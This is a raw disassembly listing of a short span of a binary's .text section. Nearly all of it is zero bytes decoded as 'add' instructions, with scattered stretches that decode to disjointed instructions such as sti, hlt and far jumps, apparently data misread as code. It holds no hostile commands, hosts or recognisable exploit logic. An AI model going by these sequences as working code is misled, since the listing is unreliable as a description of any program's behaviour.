                           .text:004019c8 d0 6b ca                         shrb   -0x36(%ebx)
                           .text:004019cb b4 bf                            mov    $0xbf,%ah
                           .text:004019cd 7f 00                            jg     0x004019cf
                           .text:004019cf 00 e0                            add    %ah,%al
                           .text:004019d1 c8 84 08 00                      enter  $0x884,$0x0
                           .text:004019d5 00 00                            add    %al,(%eax)
                           .text:004019d7 00 00                            add    %al,(%eax)
                           .text:004019d9 00 00                            add    %al,(%eax)
                           .text:004019db 00 00                            add    %al,(%eax)
                           .text:004019dd 00 00                            add    %al,(%eax)
                           .text:004019df 00 00                            add    %al,(%eax)
                           .text:004019e1 00 00                            add    %al,(%eax)
                           .text:004019e3 00 00                            add    %al,(%eax)
                           .text:004019e5 00 00                            add    %al,(%eax)
                           .text:004019e7 00 00                            add    %al,(%eax)
                           .text:004019e9 00 00                            add    %al,(%eax)
                           .text:004019eb 00 00                            add    %al,(%eax)
                           .text:004019ed 00 00                            add    %al,(%eax)
                           .text:004019ef 00 00                            add    %al,(%eax)
                           .text:004019f1 00 00                            add    %al,(%eax)
                           .text:004019f3 00 00                            add    %al,(%eax)
                           .text:004019f5 00 00                            add    %al,(%eax)
                           .text:004019f7 00 00                            add    %al,(%eax)
                           .text:004019f9 00 00                            add    %al,(%eax)
                           .text:004019fb 00 00                            add    %al,(%eax)
                           .text:004019fd 00 00                            add    %al,(%eax)
                           .text:004019ff 00 00                            add    %al,(%eax)
                           .text:00401a01 00 00                            add    %al,(%eax)
                           .text:00401a03 00 00                            add    %al,(%eax)
                           .text:00401a05 00 00                            add    %al,(%eax)
                           .text:00401a07 00 00                            add    %al,(%eax)
                           .text:00401a09 00 00                            add    %al,(%eax)
                           .text:00401a0b 00 00                            add    %al,(%eax)
                           .text:00401a0d 00 00                            add    %al,(%eax)
                           .text:00401a0f 00 00                            add    %al,(%eax)
                           .text:00401a11 00 00                            add    %al,(%eax)
                           .text:00401a13 00 00                            add    %al,(%eax)
                           .text:00401a15 00 00                            add    %al,(%eax)
                           .text:00401a17 00 00                            add    %al,(%eax)
                           .text:00401a19 00 00                            add    %al,(%eax)
                           .text:00401a1b 00 00                            add    %al,(%eax)
                           .text:00401a1d 00 00                            add    %al,(%eax)
                           .text:00401a1f 00 00                            add    %al,(%eax)
                           .text:00401a21 00 00                            add    %al,(%eax)
                           .text:00401a23 00 00                            add    %al,(%eax)
                           .text:00401a25 00 00                            add    %al,(%eax)
                           .text:00401a27 00 00                            add    %al,(%eax)
                           .text:00401a29 00 00                            add    %al,(%eax)
                           .text:00401a2b 00 00                            add    %al,(%eax)
                           .text:00401a2d 00 00                            add    %al,(%eax)
                           .text:00401a2f 00 00                            add    %al,(%eax)
                           .text:00401a31 00 00                            add    %al,(%eax)
                           .text:00401a33 00 00                            add    %al,(%eax)
                           .text:00401a35 00 00                            add    %al,(%eax)
                           .text:00401a37 00 00                            add    %al,(%eax)
                           .text:00401a39 00 00                            add    %al,(%eax)
                           .text:00401a3b 00 00                            add    %al,(%eax)
                           .text:00401a3d 00 00                            add    %al,(%eax)
                           .text:00401a3f 00 00                            add    %al,(%eax)
                           .text:00401a41 00 00                            add    %al,(%eax)
                           .text:00401a43 00 00                            add    %al,(%eax)
                           .text:00401a45 00 00                            add    %al,(%eax)
                           .text:00401a47 00 00                            add    %al,(%eax)
                           .text:00401a49 00 00                            add    %al,(%eax)
                           .text:00401a4b 00 00                            add    %al,(%eax)
                           .text:00401a4d 00 00                            add    %al,(%eax)
                           .text:00401a4f 00 00                            add    %al,(%eax)
                           .text:00401a51 00 00                            add    %al,(%eax)
                           .text:00401a53 00 00                            add    %al,(%eax)
                           .text:00401a55 00 00                            add    %al,(%eax)
                           .text:00401a57 00 00                            add    %al,(%eax)
                           .text:00401a59 00 00                            add    %al,(%eax)
                           .text:00401a5b 00 00                            add    %al,(%eax)
                           .text:00401a5d 00 00                            add    %al,(%eax)
                           .text:00401a5f 00 00                            add    %al,(%eax)
                           .text:00401a61 00 00                            add    %al,(%eax)
                           .text:00401a63 00 00                            add    %al,(%eax)
                           .text:00401a65 00 00                            add    %al,(%eax)
                           .text:00401a67 00 00                            add    %al,(%eax)
                           .text:00401a69 00 00                            add    %al,(%eax)
                           .text:00401a6b 00 00                            add    %al,(%eax)
                           .text:00401a6d 00 00                            add    %al,(%eax)
                           .text:00401a6f 00 00                            add    %al,(%eax)
                           .text:00401a71 00 00                            add    %al,(%eax)
                           .text:00401a73 00 00                            add    %al,(%eax)
                           .text:00401a75 00 00                            add    %al,(%eax)
                           .text:00401a77 00 00                            add    %al,(%eax)
                           .text:00401a79 00 00                            add    %al,(%eax)
                           .text:00401a7b 00 00                            add    %al,(%eax)
                           .text:00401a7d 00 00                            add    %al,(%eax)
                           .text:00401a7f 00 00                            add    %al,(%eax)
                           .text:00401a81 00 00                            add    %al,(%eax)
                           .text:00401a83 00 00                            add    %al,(%eax)
                           .text:00401a85 00 00                            add    %al,(%eax)
                           .text:00401a87 00 00                            add    %al,(%eax)
                           .text:00401a89 00 00                            add    %al,(%eax)
                           .text:00401a8b 00 00                            add    %al,(%eax)
                           .text:00401a8d 00 00                            add    %al,(%eax)
                           .text:00401a8f 00 00                            add    %al,(%eax)
                           .text:00401a91 00 00                            add    %al,(%eax)
                           .text:00401a93 00 00                            add    %al,(%eax)
                           .text:00401a95 00 00                            add    %al,(%eax)
                           .text:00401a97 00 00                            add    %al,(%eax)
                           .text:00401a99 00 00                            add    %al,(%eax)
                           .text:00401a9b 00 00                            add    %al,(%eax)
                           .text:00401a9d 00 00                            add    %al,(%eax)
                           .text:00401a9f 00 00                            add    %al,(%eax)
                           .text:00401aa1 00 00                            add    %al,(%eax)
                           .text:00401aa3 00 00                            add    %al,(%eax)
                           .text:00401aa5 00 00                            add    %al,(%eax)
                           .text:00401aa7 00 00                            add    %al,(%eax)
                           .text:00401aa9 00 00                            add    %al,(%eax)
                           .text:00401aab 00 00                            add    %al,(%eax)
                           .text:00401aad 00 00                            add    %al,(%eax)
                           .text:00401aaf 00 00                            add    %al,(%eax)
                           .text:00401ab1 00 00                            add    %al,(%eax)
                           .text:00401ab3 00 00                            add    %al,(%eax)
                           .text:00401ab5 00 00                            add    %al,(%eax)
                           .text:00401ab7 00 00                            add    %al,(%eax)
                           .text:00401ab9 00 00                            add    %al,(%eax)
                           .text:00401abb 00 00                            add    %al,(%eax)
                           .text:00401abd 00 00                            add    %al,(%eax)
                           .text:00401abf 00 00                            add    %al,(%eax)
                           .text:00401ac1 00 00                            add    %al,(%eax)
                           .text:00401ac3 00 00                            add    %al,(%eax)
                           .text:00401ac5 00 00                            add    %al,(%eax)
                           .text:00401ac7 00 f3                            add    %dh,%bl
                           .text:00401ac9 e9 92 d0 38 b1                   jmp    0xb178eb60
                           .text:00401ace fb                               sti    
                           .text:00401acf 44                               inc    %esp
                           .text:00401ad0 80 6a ca b4                      subb   $0xb4,-0x36(%edx)
                           .text:00401ad4 bf 7f 00 00 b0                   mov    $0xb000007f,%edi
                           .text:00401ad9 58                               pop    %eax
                           .text:00401ada 70 00                            jo     0x00401adc
                           .text:00401adc 00 00                            add    %al,(%eax)
                           .text:00401ade 00 00                            add    %al,(%eax)
                           .text:00401ae0 f4                               hlt    
                           .text:00401ae1 2c 85                            sub    $0x85,%al
                           .text:00401ae3 bc 6d 52 ad 0b                   mov    $0xbad526d,%esp
                           .text:00401ae8 30 66 ca                         xor    %ah,-0x36(%esi)
                           .text:00401aeb b4 bf                            mov    $0xbf,%ah
                           .text:00401aed 7f 00                            jg     0x00401aef
                           .text:00401aef 00 80 0f 79 ba bf                add    %al,-0x404586f1(%eax)
                           .text:00401af5 7f 00                            jg     0x00401af7
                           .text:00401af7 00 00                            add    %al,(%eax)
                           .text:00401af9 00 00                            add    %al,(%eax)
                           .text:00401afb 00 00                            add    %al,(%eax)
                           .text:00401afd 00 00                            add    %al,(%eax)
                           .text:00401aff 00 00                            add    %al,(%eax)
                           .text:00401b01 00 00                            add    %al,(%eax)
                           .text:00401b03 00 00                            add    %al,(%eax)
                           .text:00401b05 00 00                            add    %al,(%eax)
                           .text:00401b07 00 00                            add    %al,(%eax)
                           .text:00401b09 00 00                            add    %al,(%eax)
                           .text:00401b0b 00 00                            add    %al,(%eax)
                           .text:00401b0d 00 00                            add    %al,(%eax)
                           .text:00401b0f 00 00                            add    %al,(%eax)
                           .text:00401b11 00 00                            add    %al,(%eax)
                           .text:00401b13 00 00                            add    %al,(%eax)
                           .text:00401b15 00 00                            add    %al,(%eax)
                           .text:00401b17 00 00                            add    %al,(%eax)
                           .text:00401b19 00 00                            add    %al,(%eax)
                           .text:00401b1b 00 00                            add    %al,(%eax)
                           .text:00401b1d 00 00                            add    %al,(%eax)
                           .text:00401b1f 00 00                            add    %al,(%eax)
                           .text:00401b21 00 00                            add    %al,(%eax)
                           .text:00401b23 00 00                            add    %al,(%eax)
                           .text:00401b25 00 00                            add    %al,(%eax)
                           .text:00401b27 00 00                            add    %al,(%eax)
                           .text:00401b29 00 00                            add    %al,(%eax)
                           .text:00401b2b 00 00                            add    %al,(%eax)
                           .text:00401b2d 00 00                            add    %al,(%eax)
                           .text:00401b2f 00 00                            add    %al,(%eax)
                           .text:00401b31 00 00                            add    %al,(%eax)
                           .text:00401b33 00 00                            add    %al,(%eax)
                           .text:00401b35 00 00                            add    %al,(%eax)
                           .text:00401b37 00 00                            add    %al,(%eax)
                           .text:00401b39 00 00                            add    %al,(%eax)
                           .text:00401b3b 00 00                            add    %al,(%eax)
                           .text:00401b3d 00 00                            add    %al,(%eax)
                           .text:00401b3f 00 00                            add    %al,(%eax)
                           .text:00401b41 00 00                            add    %al,(%eax)
                           .text:00401b43 00 00                            add    %al,(%eax)
                           .text:00401b45 00 00                            add    %al,(%eax)
                           .text:00401b47 00 00                            add    %al,(%eax)
                           .text:00401b49 00 00                            add    %al,(%eax)
                           .text:00401b4b 00 00                            add    %al,(%eax)
                           .text:00401b4d 00 00                            add    %al,(%eax)
                           .text:00401b4f 00 00                            add    %al,(%eax)
                           .text:00401b51 00 00                            add    %al,(%eax)
                           .text:00401b53 00 00                            add    %al,(%eax)
                           .text:00401b55 00 00                            add    %al,(%eax)
                           .text:00401b57 00 f9                            add    %bh,%cl
                           .text:00401b59 15 c7 b7 d9 5a                   adc    $0x5ad9b7c7,%eax
                           .text:00401b5e 91                               xchg   %eax,%ecx
                           .text:00401b5f 4b                               dec    %ebx
                           .text:00401b60 b0 61                            mov    $0x61,%al
                           .text:00401b62 ca b4 bf                         lret   $0xbfb4
                           .text:00401b65 7f 00                            jg     0x00401b67
                           .text:00401b67 00 60 58                         add    %ah,0x58(%eax)
                           .text:00401b6a 70 00                            jo     0x00401b6c
                           .text:00401b6c 00 00                            add    %al,(%eax)
                           .text:00401b6e 00 00                            add    %al,(%eax)
                           .text:00401b70 00 00                            add    %al,(%eax)
                           .text:00401b72 00 00                            add    %al,(%eax)
                           .text:00401b74 00 00                            add    %al,(%eax)
                           .text:00401b76 00 00                            add    %al,(%eax)
                           .text:00401b78 00 00                            add    %al,(%eax)
                           .text:00401b7a 00 00                            add    %al,(%eax)
                           .text:00401b7c 00 00                            add    %al,(%eax)
                           .text:00401b7e 00 00                            add    %al,(%eax)
                           .text:00401b80 00 00                            add    %al,(%eax)
                           .text:00401b82 00 00                            add    %al,(%eax)
                           .text:00401b84 00 00                            add    %al,(%eax)
                           .text:00401b86 00 00                            add    %al,(%eax)
                           .text:00401b88 00 00                            add    %al,(%eax)
                           .text:00401b8a 00 00                            add    %al,(%eax)
                           .text:00401b8c 00 00                            add    %al,(%eax)
                           .text:00401b8e 00 00                            add    %al,(%eax)
                           .text:00401b90 00 00                            add    %al,(%eax)
                           .text:00401b92 00 00                            add    %al,(%eax)
                           .text:00401b94 00 00                            add    %al,(%eax)
                           .text:00401b96 00 00                            add    %al,(%eax)
                           .text:00401b98 00 00                            add    %al,(%eax)
                           .text:00401b9a 00 00                            add    %al,(%eax)
                           .text:00401b9c 00 00                            add    %al,(%eax)
                           .text:00401b9e 00 00                            add    %al,(%eax)
                           .text:00401ba0 00 00                            add    %al,(%eax)
                           .text:00401ba2 00 00                            add    %al,(%eax)
                           .text:00401ba4 00 00                            add    %al,(%eax)
                           .text:00401ba6 00 00                            add    %al,(%eax)
                           .text:00401ba8 00 00                            add    %al,(%eax)
                           .text:00401baa 00 00                            add    %al,(%eax)
                           .text:00401bac 00 00                            add    %al,(%eax)
                           .text:00401bae 00 00                            add    %al,(%eax)
                           .text:00401bb0 00 00                            add    %al,(%eax)
                           .text:00401bb2 00 00                            add    %al,(%eax)
                           .text:00401bb4 00 00                            add    %al,(%eax)
                           .text:00401bb6 00 00                            add    %al,(%eax)
                           .text:00401bb8 00 00                            add    %al,(%eax)
                           .text:00401bba 00 00                            add    %al,(%eax)
                           .text:00401bbc 00 00                            add    %al,(%eax)
                           .text:00401bbe 00 00                            add    %al,(%eax)
                           .text:00401bc0 00 00                            add    %al,(%eax)
                           .text:00401bc2 00 00                            add    %al,(%eax)
                           .text:00401bc4 00 00                            add    %al,(%eax)
                           .text:00401bc6 00 00                            add    %al,(%eax)
                           .text:00401bc8 00 00                            add    %al,(%eax)
                           .text:00401bca 00 00                            add    %al,(%eax)
                           .text:00401bcc 00 00                            add    %al,(%eax)
                           .text:00401bce 00 00                            add    %al,(%eax)
                           .text:00401bd0 00 00                            add    %al,(%eax)
                           .text:00401bd2 00 00                            add    %al,(%eax)
                           .text:00401bd4 00 00                            add    %al,(%eax)
                           .text:00401bd6 00 00                            add    %al,(%eax)
                           .text:00401bd8 00 00                            add    %al,(%eax)
                           .text:00401bda 00 00                            add    %al,(%eax)
                           .text:00401bdc 00 00                            add    %al,(%eax)
                           .text:00401bde 00 00                            add    %al,(%eax)
                           .text:00401be0 00 00                            add    %al,(%eax)
                           .text:00401be2 00 00                            add    %al,(%eax)
                           .text:00401be4 00 00                            add    %al,(%eax)
                           .text:00401be6 00 00                            add    %al,(%eax)
                           .text:00401be8 7f 3f                            jg     0x00401c29
                           .text:00401bea 50                               push   %eax
                           .text:00401beb 36 57                            ss push %edi
                           .text:00401bed a6                               cmpsb  %es:(%edi),%ds:(%esi)
                           .text:00401bee b0 07                            mov    $0x7,%al
                           .text:00401bf0 70 08                            jo     0x00401bfa
                           .text:00401bf2 ea b8 bf 7f 00 00 80             ljmp   $0x8000,$0x7fbfb8
                           .text:00401bf9 6f                               outsl  %ds:(%esi),(%dx)
                           .text:00401bfa 33 b5 bf 7f 00 00                xor    0x7fbf(%ebp),%esi
                           .text:00401c00 10 0c 00                         adc    %cl,(%eax,%eax,1)
                           .text:00401c03 00 00                            add    %al,(%eax)
                           .text:00401c05 00 00                            add    %al,(%eax)
                           .text:00401c07 00 10                            add    %dl,(%eax)
                           .text:00401c09 03 00                            add    (%eax),%eax
                           .text:00401c0b 00 00                            add    %al,(%eax)
                           .text:00401c0d 00 00                            add    %al,(%eax)
                           .text:00401c0f 00 00                            add    %al,(%eax)
                           .text:00401c11 00 00                            add    %al,(%eax)
                           .text:00401c13 00 00                            add    %al,(%eax)
                           .text:00401c15 00 00                            add    %al,(%eax)
                           .text:00401c17 00 00                            add    %al,(%eax)
                           .text:00401c19 00 00                            add    %al,(%eax)
                           .text:00401c1b 00 00                            add    %al,(%eax)
                           .text:00401c1d 00 00                            add    %al,(%eax)
                           .text:00401c1f 00 00                            add    %al,(%eax)
                           .text:00401c21 00 00                            add    %al,(%eax)
                           .text:00401c23 00 00                            add    %al,(%eax)
                           .text:00401c25 00 00                            add    %al,(%eax)
                           .text:00401c27 00 01                            add    %al,(%ecx)
                           .text:00401c29 22 d5                            and    %ch,%dl
                           .text:00401c2b 03 f4                            add    %esp,%esi
                           .text:00401c2d 95                               xchg   %eax,%ebp
                           .text:00401c2e 56                               push   %esi
                           .text:00401c2f 26 80 c4 11                      es add $0x11,%ah
                           .text:00401c33 b5 bf                            mov    $0xbf,%ch
                           .text:00401c35 7f 00                            jg     0x00401c37
                           .text:00401c37 00 78 ad                         add    %bh,-0x53(%eax)
                           .text:00401c3a 30 08                            xor    %cl,(%eax)
                           .text:00401c3c 00 00                            add    %al,(%eax)
                           .text:00401c3e 00 00                            add    %al,(%eax)
                           .text:00401c40 00 00                            add    %al,(%eax)
                           .text:00401c42 00 00                            add    %al,(%eax)
                           .text:00401c44 00 00                            add    %al,(%eax)
                           .text:00401c46 00 00                            add    %al,(%eax)
                           .text:00401c48 00 00                            add    %al,(%eax)
                           .text:00401c4a 00 00                            add    %al,(%eax)
                           .text:00401c4c 00 00                            add    %al,(%eax)
                           .text:00401c4e 00 00                            add    %al,(%eax)
                           .text:00401c50 00 00                            add    %al,(%eax)
                           .text:00401c52 00 00                            add    %al,(%eax)
                           .text:00401c54 00 00                            add    %al,(%eax)
                           .text:00401c56 00 00                            add    %al,(%eax)
                           .text:00401c58 00 00                            add    %al,(%eax)
                           .text:00401c5a 00 00                            add    %al,(%eax)
                           .text:00401c5c 00 00                            add    %al,(%eax)
                           .text:00401c5e 00 00                            add    %al,(%eax)
                           .text:00401c60 00 00                            add    %al,(%eax)
                           .text:00401c62 00 00                            add    %al,(%eax)
                           .text:00401c64 00 00                            add    %al,(%eax)
                           .text:00401c66 00 00                            add    %al,(%eax)
                           .text:00401c68 00 00                            add    %al,(%eax)
                           .text:00401c6a 00 00                            add    %al,(%eax)
                           .text:00401c6c 00 00                            add    %al,(%eax)
                           .text:00401c6e 00 00                            add    %al,(%eax)
                           .text:00401c70 24 17                            and    $0x17,%al
                           .text:00401c72 f6 60 38                         mulb   0x38(%eax)
                           .text:00401c75 9e                               sahf   
                           .text:00401c76 75 e6                            jne    0x00401c5e
                           .text:00401c78 e0 c7                            loopne 0x00401c41
                           .text:00401c7a 11 b5 bf 7f 00 00                adc    %esi,0x7fbf(%ebp)
                           .text:00401c80 d0 d1                            rcl    %cl
                           .text:00401c82 39 b4 bf 7f 00 00 00             cmp    %esi,0x7f(%edi,%edi,4)
                           .text:00401c89 00 00                            add    %al,(%eax)
                           .text:00401c8b 00 00                            add    %al,(%eax)
                           .text:00401c8d 00 00                            add    %al,(%eax)
                           .text:00401c8f 00 00                            add    %al,(%eax)
                           .text:00401c91 00 00                            add    %al,(%eax)
                           .text:00401c93 00 00                            add    %al,(%eax)
                           .text:00401c95 00 00                            add    %al,(%eax)
                           .text:00401c97 00 00                            add    %al,(%eax)
                           .text:00401c99 00 00                            add    %al,(%eax)
                           .text:00401c9b 00 00                            add    %al,(%eax)
                           .text:00401c9d 00 00                            add    %al,(%eax)
                           .text:00401c9f 00 00                            add    %al,(%eax)
                           .text:00401ca1 00 00                            add    %al,(%eax)
                           .text:00401ca3 00 00                            add    %al,(%eax)
                           .text:00401ca5 00 00                            add    %al,(%eax)
                           .text:00401ca7 00 00                            add    %al,(%eax)
                           .text:00401ca9 00 00                            add    %al,(%eax)
                           .text:00401cab 00 00                            add    %al,(%eax)
                           .text:00401cad 00 00                            add    %al,(%eax)
                           .text:00401caf 00 00                            add    %al,(%eax)
                           .text:00401cb1 00 00                            add    %al,(%eax)
                           .text:00401cb3 00 00                            add    %al,(%eax)
                           .text:00401cb5 00 00                            add    %al,(%eax)
                           .text:00401cb7 00 07                            add    %al,(%edi)
                           .text:00401cb9 21 90 ff 32 7a 0a                and    %edx,0xa7a32ff(%eax)
                           .text:00401cbf 8f 00                            popl   (%eax)
                           .text:00401cc1 cc                               int3   
                           .text:00401cc2 11 b5 bf 7f 00 00                adc    %esi,0x7fbf(%ebp)
                           .text:00401cc8 90                               nop
                           .text:00401cc9 41                               inc    %ecx
                           .text:00401cca 3a b4 bf 7f 00 00 68             cmp    0x6800007f(%edi,%edi,4),%dh
                           .text:00401cd1 19 74 74 a6                      sbb    %esi,-0x5a(%esp,%esi,2)
                           .text:00401cd5 1b 75 71                         sbb    0x71(%ebp),%esi
                           .text:00401cd8 d0 6b ca                         shrb   -0x36(%ebx)
                           .text:00401cdb b4 bf                            mov    $0xbf,%ah
                           .text:00401cdd 7f 00                            jg     0x00401cdf
                           .text:00401cdf 00 a8 ad 30 08 00                add    %ch,0x830ad(%eax)
                           .text:00401ce5 00 00                            add    %al,(%eax)
                           .text:00401ce7 00 00                            add    %al,(%eax)
                           .text:00401ce9 00 00                            add    %al,(%eax)
                           .text:00401ceb 00 00                            add    %al,(%eax)
                           .text:00401ced 00 00                            add    %al,(%eax)
                           .text:00401cef 00 00                            add    %al,(%eax)
                           .text:00401cf1 00 00                            add    %al,(%eax)
                           .text:00401cf3 00 00                            add    %al,(%eax)
                           .text:00401cf5 00 00                            add    %al,(%eax)
                           .text:00401cf7 00 00                            add    %al,(%eax)
                           .text:00401cf9 00 00                            add    %al,(%eax)
                           .text:00401cfb 00 00                            add    %al,(%eax)
                           .text:00401cfd 00 00                            add    %al,(%eax)
                           .text:00401cff 00 00                            add    %al,(%eax)
                           .text:00401d01 00 00                            add    %al,(%eax)
                           .text:00401d03 00 00                            add    %al,(%eax)
                           .text:00401d05 00 00                            add    %al,(%eax)
                           .text:00401d07 00 00                            add    %al,(%eax)
                           .text:00401d09 00 00                            add    %al,(%eax)
                           .text:00401d0b 00 00                            add    %al,(%eax)
                           .text:00401d0d 00 00                            add    %al,(%eax)
                           .text:00401d0f 00 00                            add    %al,(%eax)
                           .text:00401d11 00 00                            add    %al,(%eax)
                           .text:00401d13 00 00                            add    %al,(%eax)
                           .text:00401d15 00 00                            add    %al,(%eax)
                           .text:00401d17 00 00                            add    %al,(%eax)
                           .text:00401d19 00 00                            add    %al,(%eax)
                           .text:00401d1b 00 00                            add    %al,(%eax)
                           .text:00401d1d 00 00                            add    %al,(%eax)
                           .text:00401d1f 00 00                            add    %al,(%eax)
                           .text:00401d21 00 00                            add    %al,(%eax)
                           .text:00401d23 00 00                            add    %al,(%eax)
                           .text:00401d25 00 00                            add    %al,(%eax)
                           .text:00401d27 00 00                            add    %al,(%eax)
                           .text:00401d29 00 00                            add    %al,(%eax)
                           .text:00401d2b 00 00                            add    %al,(%eax)
                           .text:00401d2d 00 00                            add    %al,(%eax)
                           .text:00401d2f 00 0c 28                         add    %cl,(%eax,%ebp,1)
                           .text:00401d32 9e                               sahf   
                           .text:00401d33 e5 a4                            in     $0xa4,%eax
                           .text:00401d35 b6 fc                            mov    $0xfc,%dh
                           .text:00401d37 35 c0 09 ea b8                   xor    $0xb8ea09c0,%eax
                           .text:00401d3c bf 7f 00 00 90                   mov    $0x9000007f,%edi
                           .text:00401d41 d1 39                            sarl   (%ecx)
                           .text:00401d43 b4 bf                            mov    $0xbf,%ah
                           .text:00401d45 7f 00                            jg     0x00401d47
                           .text:00401d47 00 00                            add    %al,(%eax)
                           .text:00401d49 00 00                            add    %al,(%eax)
                           .text:00401d4b 00 00                            add    %al,(%eax)
                           .text:00401d4d 00 00                            add    %al,(%eax)
                           .text:00401d4f 00 00                            add    %al,(%eax)
                           .text:00401d51 00 00                            add    %al,(%eax)
                           .text:00401d53 00 00                            add    %al,(%eax)
                           .text:00401d55 00 00                            add    %al,(%eax)
                           .text:00401d57 00 00                            add    %al,(%eax)
                           .text:00401d59 00 00                            add    %al,(%eax)
                           .text:00401d5b 00 00                            add    %al,(%eax)
                           .text:00401d5d 00 00                            add    %al,(%eax)
                           .text:00401d5f 00 ce                            add    %cl,%dh
                           .text:00401d61 11 c6                            adc    %eax,%esi
                           .text:00401d63 f6 d0                            not    %al
                           .text:00401d65 28 d7                            sub    %dl,%bh
                           .text:00401d67 25 f0 00 ea b8                   and    $0xb8ea00f0,%eax
                           .text:00401d6c bf 7f 00 00 60                   mov    $0x6000007f,%edi
                           .text:00401d71 58                               pop    %eax
                           .text:00401d72 70 00                            jo     0x00401d74
                           .text:00401d74 00 00                            add    %al,(%eax)
                           .text:00401d76 00 00                            add    %al,(%eax)
                           .text:00401d78 00 00                            add    %al,(%eax)
                           .text:00401d7a 00 00                            add    %al,(%eax)
                           .text:00401d7c 00 00                            add    %al,(%eax)
                           .text:00401d7e 00 00                            add    %al,(%eax)
                           .text:00401d80 00 00                            add    %al,(%eax)
                           .text:00401d82 00 00                            add    %al,(%eax)
                           .text:00401d84 00 00                            add    %al,(%eax)
                           .text:00401d86 00 00                            add    %al,(%eax)
                           .text:00401d88 00 00                            add    %al,(%eax)
                           .text:00401d8a 00 00                            add    %al,(%eax)
                           .text:00401d8c 00 00                            add    %al,(%eax)
                           .text:00401d8e 00 00                            add    %al,(%eax)
                           .text:00401d90 f0 85 d8                         lock test %ebx,%eax
                           .text:00401d93 e0 1d                            loopne 0x00401db2
                           .text:00401d95 65 80 00 60                      addb   $0x60,%gs:(%eax)
                           .text:00401d99 06                               push   %es
                           .text:00401d9a ea b8 bf 7f 00 00 70             ljmp   $0x7000,$0x7fbfb8
                           .text:00401da1 d1 39                            sarl   (%ecx)
                           .text:00401da3 b4 bf                            mov    $0xbf,%ah
                           .text:00401da5 7f 00                            jg     0x00401da7
                           .text:00401da7 00 00                            add    %al,(%eax)
                           .text:00401da9 00 00                            add    %al,(%eax)
                           .text:00401dab 00 00                            add    %al,(%eax)
                           .text:00401dad 00 00                            add    %al,(%eax)
                           .text:00401daf 00 00                            add    %al,(%eax)
                           .text:00401db1 00 00                            add    %al,(%eax)
                           .text:00401db3 00 00                            add    %al,(%eax)
                           .text:00401db5 00 00                            add    %al,(%eax)
                           .text:00401db7 00 00                            add    %al,(%eax)
                           .text:00401db9 00 00                            add    %al,(%eax)
                           .text:00401dbb 00 00                            add    %al,(%eax)
                           .text:00401dbd 00 00                            add    %al,(%eax)
                           .text:00401dbf 00 00                            add    %al,(%eax)
                           .text:00401dc1 00 00                            add    %al,(%eax)
                           .text:00401dc3 00 00                            add    %al,(%eax)
                           .text:00401dc5 00 00                            add    %al,(%eax)
                           .text:00401dc7 00 00                            add    %al,(%eax)
                           .text:00401dc9 00 00                            add    %al,(%eax)
                           .text:00401dcb 00 00                            add    %al,(%eax)
                           .text:00401dcd 00 00                            add    %al,(%eax)
                           .text:00401dcf 00 00                            add    %al,(%eax)
                           .text:00401dd1 00 00                            add    %al,(%eax)
                           .text:00401dd3 00 00                            add    %al,(%eax)
                           .text:00401dd5 00 00                            add    %al,(%eax)
                           .text:00401dd7 00 93 f9 57 14 63                add    %dl,0x631457f9(%ebx)
                           .text:00401ddd df 3f                            fistpll (%edi)
                           .text:00401ddf eb c8                            jmp    0x00401da9
                           .text:00401de1 13 cf                            adc    %edi,%ecx
                           .text:00401de3 b8 bf 7f 00 00                   mov    $0x7fbf,%eax
                           .text:00401de8 b0 58                            mov    $0x58,%al
                           .text:00401dea 70 00                            jo     0x00401dec
                           .text:00401dec 00 00                            add    %al,(%eax)
                           .text:00401dee 00 00                            add    %al,(%eax)
                           .text:00401df0 00 00                            add    %al,(%eax)
                           .text:00401df2 00 00                            add    %al,(%eax)
                           .text:00401df4 00 00                            add    %al,(%eax)
                           .text:00401df6 00 00                            add    %al,(%eax)
                           .text:00401df8 00 00                            add    %al,(%eax)
                           .text:00401dfa 00 00                            add    %al,(%eax)
                           .text:00401dfc 00 00                            add    %al,(%eax)
                           .text:00401dfe 00 00                            add    %al,(%eax)
                           .text:00401e00 00 00                            add    %al,(%eax)
                           .text:00401e02 00 00                            add    %al,(%eax)
                           .text:00401e04 00 00                            add    %al,(%eax)
                           .text:00401e06 00 00                            add    %al,(%eax)
                           .text:00401e08 ae                               scas   %es:(%edi),%al
                           .text:00401e09 0b 37                            or     (%edi),%esi
                           .text:00401e0b 0c 59                            or     $0x59,%al
                           .text:00401e0d f3 03 fd                         repz add %ebp,%edi
                           .text:00401e10 20 aa 8b b4 bf 7f                and    %ch,0x7fbfb48b(%edx)
                           .text:00401e16 00 00                            add    %al,(%eax)
                           .text:00401e18 f0 94                            lock xchg %eax,%esp
                           .text:00401e1a 4c                               dec    %esp
                           .text:00401e1b 01 00                            add    %eax,(%eax)
                           .text:00401e1d 00 00                            add    %al,(%eax)
                           .text:00401e1f 00 00                            add    %al,(%eax)
                           .text:00401e21 00 00                            add    %al,(%eax)
                           .text:00401e23 00 00                            add    %al,(%eax)
                           .text:00401e25 00 00                            add    %al,(%eax)
                           .text:00401e27 00 00                            add    %al,(%eax)
                           .text:00401e29 00 00                            add    %al,(%eax)
                           .text:00401e2b 00 00                            add    %al,(%eax)
                           .text:00401e2d 00 00                            add    %al,(%eax)
                           .text:00401e2f 00 00                            add    %al,(%eax)
                           .text:00401e31 00 00                            add    %al,(%eax)
                           .text:00401e33 00 00                            add    %al,(%eax)
                           .text:00401e35 00 00                            add    %al,(%eax)
                           .text:00401e37 00 00                            add    %al,(%eax)
                           .text:00401e39 00 00                            add    %al,(%eax)
                           .text:00401e3b 00 00                            add    %al,(%eax)
                           .text:00401e3d 00 00                            add    %al,(%eax)
                           .text:00401e3f 00 00                            add    %al,(%eax)
                           .text:00401e41 00 00                            add    %al,(%eax)
                           .text:00401e43 00 00                            add    %al,(%eax)
                           .text:00401e45 00 00                            add    %al,(%eax)
                           .text:00401e47 00 00                            add    %al,(%eax)
                           .text:00401e49 00 00                            add    %al,(%eax)
                           .text:00401e4b 00 00                            add    %al,(%eax)
                           .text:00401e4d 00 00                            add    %al,(%eax)
                           .text:00401e4f 00 00                            add    %al,(%eax)
                           .text:00401e51 00 00                            add    %al,(%eax)
                           .text:00401e53 00 00                            add    %al,(%eax)
                           .text:00401e55 00 00                            add    %al,(%eax)
                           .text:00401e57 00 00                            add    %al,(%eax)
                           .text:00401e59 00 00                            add    %al,(%eax)
                           .text:00401e5b 00 00                            add    %al,(%eax)
                           .text:00401e5d 00 00                            add    %al,(%eax)
                           .text:00401e5f 00 00                            add    %al,(%eax)
                           .text:00401e61 00 00                            add    %al,(%eax)
                           .text:00401e63 00 00                            add    %al,(%eax)
